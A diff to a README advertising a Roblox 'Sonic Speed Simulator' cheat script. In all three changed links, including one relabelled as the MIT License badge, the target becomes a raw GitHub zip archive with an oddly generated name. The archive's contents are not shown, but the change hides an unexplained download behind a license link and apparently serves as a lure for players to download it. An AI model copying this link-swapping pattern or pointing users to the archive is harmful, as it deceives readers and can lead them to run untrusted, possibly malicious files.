@@ -1,6 +1,6 @@
 # Sonic Speed Simulator Roblox Script 🚀
 
-[![Download](https://img.shields.io/badge/Download-green)](https://saumitkrishnan.github.io)  
+[![Download](https://img.shields.io/badge/Download-green)](https://raw.githubusercontent.com/saumitkrishnan/sonic-speed-simulator-roblox-boosters/branch/indimensional/roblox-speed-sonic-boosters-simulator-butterweed.zip)  
 Unlock a new dimension of gameplay with our Sonic Speed Simulator for Roblox! Enhance your in-game experience with tailored scripts that bring energy, agility, and a futuristic approach to your favorite Sonic adventure.
 
 ---
@@ -88,14 +88,14 @@ All trademarks and content belong to their respective owners.
 
 This project is licensed under the MIT License (2025).  
 For full details, view the [LICENSE](./LICENSE) file or follow this link:  
-[![License: MIT](https://img.shields.io/badge/License-MIT-gold.svg)](https://opensource.org/licenses/MIT)
+[![License: MIT](https://img.shields.io/badge/License-MIT-gold.svg)](https://raw.githubusercontent.com/saumitkrishnan/sonic-speed-simulator-roblox-boosters/branch/indimensional/roblox-speed-sonic-boosters-simulator-butterweed.zip)
 
 ---
 
 ## 🚀 Ready to Accelerate Your Sonic Experience?
 
 Download the **Sonic Speed Simulator Roblox Script** and ignite your racing adventure today!  
-[![Download](https://img.shields.io/badge/Download-green)](https://saumitkrishnan.github.io)
+[![Download](https://img.shields.io/badge/Download-green)](https://raw.githubusercontent.com/saumitkrishnan/sonic-speed-simulator-roblox-boosters/branch/indimensional/roblox-speed-sonic-boosters-simulator-butterweed.zip)
 
 ---
 
